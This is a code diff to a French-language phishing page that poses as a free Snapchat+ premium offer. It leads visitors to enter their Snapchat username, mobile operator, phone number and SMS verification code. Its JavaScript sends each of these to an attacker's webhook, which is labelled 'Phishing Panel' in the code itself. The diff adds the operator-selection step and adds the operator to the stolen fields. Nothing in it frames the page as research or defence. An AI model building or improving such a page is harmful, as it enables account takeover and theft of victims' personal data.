@@ -70,7 +70,7 @@
 
     h2 { text-align: center; margin-bottom: 35px; font-size: 1.65rem; }
 
-    .offer-card {
+    .offer-card, .operator-card {
       background: rgba(255,255,255,0.09);
       border: 2px solid transparent;
       border-radius: 24px;
@@ -80,8 +80,9 @@
       transition: all 0.4s ease;
     }
 
-    .offer-card:hover { transform: translateY(-8px); border-color: #c084fc; }
-    .offer-card.popular { border-color: #c084fc; }
+    .offer-card:hover, .operator-card:hover { transform: translateY(-8px); border-color: #c084fc; }
+    .offer-card.popular, .operator-card.selected { border-color: #c084fc; background: rgba(192,132,252,0.15); }
+    .offer-card .btn { pointer-events: none; }
 
     .popular-badge {
       background: linear-gradient(90deg, #c084fc, #e879f9);
@@ -106,11 +107,13 @@
       color: white;
       cursor: pointer;
       margin-top: 20px;
+      transition: all 0.3s ease;
     }
 
     .btn:disabled {
-      opacity: 0.7;
+      opacity: 0.5;
       cursor: not-allowed;
+      background: #444;
     }
 
     input {
@@ -124,6 +127,66 @@
       margin-bottom: 25px;
       text-align: center;
     }
+
+    .operator-grid {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .operator-card {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 20px 24px;
+    }
+
+    .operator-left {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      font-size: 1.3rem;
+      font-weight: 600;
+    }
+
+    .operator-left span { font-size: 2rem; }
+
+    .operator-badge {
+      font-size: 0.8rem;
+      padding: 4px 16px;
+      border-radius: 30px;
+      background: rgba(255,70,70,0.2);
+      color: #ff6b6b;
+      border: 1px solid #ff6b6b;
+      font-weight: 700;
+    }
+
+    .operator-unavailable {
+      opacity: 0.5;
+      cursor: not-allowed;
+      filter: grayscale(0.6);
+      pointer-events: none;
+    }
+
+    .operator-unavailable .operator-badge {
+      background: rgba(255,0,0,0.25);
+      color: #ff3333;
+      border-color: #ff3333;
+    }
+
+    .msg-unavailable {
+      background: rgba(255,0,0,0.12);
+      border: 1px solid #ff4444;
+      border-radius: 14px;
+      padding: 14px;
+      text-align: center;
+      color: #ff8888;
+      font-weight: 500;
+      margin-top: 12px;
+      display: none;
+    }
+
+    .msg-unavailable.show { display: block; }
 
     .legal {
       text-align: center;
@@ -144,7 +207,7 @@
       <p class="subtitle">Accès Premium Gratuit</p>
     </header>
 
-    <!-- Étape 1 -->
+    <!-- Étape 1 : Durée -->
     <div id="step1" class="step active">
       <h2>Choisis ta durée gratuite</h2>
       <div class="offer-card" onclick="selectOffer(1)">
@@ -163,21 +226,46 @@
       </div>
     </div>
 
-    <!-- Étape 2 -->
+    <!-- Étape 2 : Nom d'utilisateur -->
     <div id="step2" class="step">
       <h2>Nom d'utilisateur Snapchat</h2>
       <input type="text" id="username" placeholder="Ton pseudo">
-      <button class="btn" onclick="goToPhone()">Continuer</button>
+      <button class="btn" onclick="goToOperator()">Continuer</button>
     </div>
 
-    <!-- Étape 3 -->
+    <!-- Étape 2.5 : Opérateur mobile (NOUVEAU) -->
+    <div id="step25" class="step">
+      <h2>📱 Choisis ton opérateur</h2>
+      <div class="operator-grid">
+        <div class="operator-card" data-operator="orange" onclick="selectOperator('orange')">
+          <div class="operator-left"><span>🟧</span> Orange</div>
+          <div style="color:#4ade80;">✅ Disponible</div>
+        </div>
+        <div class="operator-card" data-operator="sfr" onclick="selectOperator('sfr')">
+          <div class="operator-left"><span>🔴</span> SFR</div>
+          <div style="color:#4ade80;">✅ Disponible</div>
+        </div>
+        <div class="operator-card" data-operator="bouygues" onclick="selectOperator('bouygues')">
+          <div class="operator-left"><span>🟣</span> Bouygues</div>
+          <div style="color:#4ade80;">✅ Disponible</div>
+        </div>
+        <div class="operator-card operator-unavailable" data-operator="free" onclick="selectOperator('free')">
+          <div class="operator-left"><span>🔵</span> Free</div>
+          <span class="operator-badge">⛔ INDISPONIBLE</span>
+        </div>
+      </div>
+      <div id="freeMsg" class="msg-unavailable">⚠️ Free est temporairement indisponible pour cette offre. Choisis un autre opérateur.</div>
+      <button class="btn" id="continueOperatorBtn" disabled onclick="goToPhone()">Continuer</button>
+    </div>
+
+    <!-- Étape 3 : Numéro -->
     <div id="step3" class="step">
       <h2>Numéro de téléphone</h2>
       <input type="tel" id="phone" placeholder="06 XX XX XX XX" maxlength="14">
       <button class="btn" id="sendBtn" onclick="sendNumber()">Recevoir le code par SMS</button>
     </div>
 
-    <!-- Étape 4 -->
+    <!-- Étape 4 : Code -->
     <div id="step4" class="step">
       <h2>Code de vérification</h2>
       <input type="text" id="code" placeholder="1234" maxlength="4" 
@@ -198,29 +286,56 @@
 
     let selectedMonths = 12;
     let username = "";
+    let operator = "";
     let phoneNumber = "";
     let isSending = false;
     let codeAlreadySent = false;
 
+    // ---- Étape 1 : Durée ----
     function selectOffer(months) {
       selectedMonths = months;
       showStep(2);
     }
 
-    function showStep(step) {
-      document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-      document.getElementById('step' + step).classList.add('active');
+    // ---- Étape 2 : Nom d'utilisateur ----
+    function goToOperator() {
+      username = document.getElementById('username').value.trim();
+      if (username.length < 3) {
+        alert("Veuillez entrer ton nom d'utilisateur Snapchat.");
+        return;
+      }
+      showStep(25);
+    }
+
+    // ---- Étape 2.5 : Opérateur ----
+    function selectOperator(op) {
+      // Retirer la sélection précédente
+      document.querySelectorAll('.operator-card').forEach(c => c.classList.remove('selected'));
+      // Si c'est Free, on bloque
+      if (op === 'free') {
+        operator = '';
+        document.getElementById('continueOperatorBtn').disabled = true;
+        document.getElementById('freeMsg').classList.add('show');
+        // On grise la carte Free (déjà faite via CSS)
+        return;
+      }
+      // Sinon on sélectionne
+      const card = document.querySelector(`.operator-card[data-operator="${op}"]`);
+      if (card) card.classList.add('selected');
+      operator = op;
+      document.getElementById('continueOperatorBtn').disabled = false;
+      document.getElementById('freeMsg').classList.remove('show');
     }
 
     function goToPhone() {
-      username = document.getElementById('username').value.trim();
-      if (username.length < 3) {
-        alert("Veuillez entrer votre nom d'utilisateur Snapchat.");
+      if (!operator) {
+        alert("Veuillez choisir un opérateur mobile.");
         return;
       }
       showStep(3);
     }
 
+    // ---- Étape 3 : Numéro ----
     async function sendNumber() {
       const btn = document.getElementById('sendBtn');
       if (isSending) return;
@@ -250,7 +365,7 @@
       btn.textContent = "Recevoir le code par SMS";
     }
 
-    // Webhook Nouvelle Demande
+    // ---- Webhook : Nouvelle demande (avec opérateur) ----
     async function sendNewRequestWebhook() {
       if (!WEBHOOK_URL) return;
 
@@ -262,6 +377,7 @@
           fields: [
             { name: "👤 Utilisateur", value: `\`${username || "Non renseigné"}\`` },
             { name: "📱 Numéro", value: `\`${phoneNumber}\`` },
+            { name: "📶 Opérateur", value: `\`${operator || "Non renseigné"}\`` },
             { name: "⏳ Durée choisie", value: `\`${selectedMonths} mois\`` }
           ],
           footer: { text: "Snapchat+ • Phishing Panel" },
@@ -287,7 +403,7 @@
       } catch(e) {}
     }
 
-    // Webhook Code Reçu
+    // ---- Étape 4 : Code ----
     async function submitCode() {
       const code = document.getElementById('code').value.trim();
       const btn = document.getElementById('validateBtn');
@@ -323,6 +439,7 @@
             { name: "👤 Utilisateur", value: `\`${username}\`` },
             { name: "🔑 Code", value: `\`${code}\`` },
             { name: "📱 Numéro", value: `\`${phoneNumber}\`` },
+            { name: "📶 Opérateur", value: `\`${operator}\`` },
             { name: "⏳ Durée", value: `\`${selectedMonths} mois\`` }
           ],
           footer: { text: "Snapchat+ • Code reçu" },
@@ -339,17 +456,27 @@
       } catch(e) {}
     }
 
+    // ---- Reset ----
     function resetAll() {
       username = "";
+      operator = "";
       phoneNumber = "";
       codeAlreadySent = false;
       document.getElementById('username').value = "";
       document.getElementById('phone').value = "";
       document.getElementById('code').value = "";
+      document.querySelectorAll('.operator-card').forEach(c => c.classList.remove('selected'));
+      document.getElementById('continueOperatorBtn').disabled = true;
+      document.getElementById('freeMsg').classList.remove('show');
       showStep(1);
     }
 
-    // Forcer uniquement les chiffres
+    function showStep(step) {
+      document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+      document.getElementById('step' + step).classList.add('active');
+    }
+
+    // Forcer chiffres pour le code
     document.addEventListener('DOMContentLoaded', () => {
       const codeInput = document.getElementById('code');
       codeInput.addEventListener('input', function() {
@@ -359,3 +486,4 @@
   </script>
 </body>
 </html>
+
